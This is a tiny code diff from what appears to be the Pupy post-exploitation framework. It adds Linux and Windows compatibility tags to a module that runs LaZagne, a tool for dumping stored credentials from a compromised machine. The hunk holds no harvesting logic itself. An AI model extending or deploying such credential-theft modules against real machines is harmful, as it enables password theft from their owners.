@@ -13,7 +13,7 @@ from pupylib.utils.rpyc_utils import redirected_stdio
 
 __class_name__="LaZagne"
 
-@config(cat="creds")
+@config(cat="creds", compat=["linux", "windows"])
 class LaZagne(PupyModule):
     """
         execute LaZagne (Windows / Linux)
